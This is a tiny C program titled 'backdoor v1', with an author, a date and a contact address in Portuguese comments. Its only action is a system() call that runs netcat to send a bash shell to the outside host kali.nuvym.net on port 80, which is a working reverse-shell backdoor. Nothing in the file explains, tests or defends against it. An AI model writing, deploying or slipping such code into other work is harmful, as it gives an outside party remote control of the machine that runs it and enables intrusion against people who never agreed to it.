// backdoor v1
// Adiel Ribeiro
// 03out2022
// contato@nuvym.net
///////////////////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <stdlib.h> // funcao de sistema, perigosa
int main(void){
    system("nc -e /bin/bash kali.nuvym.net 80");
    return 0;
}
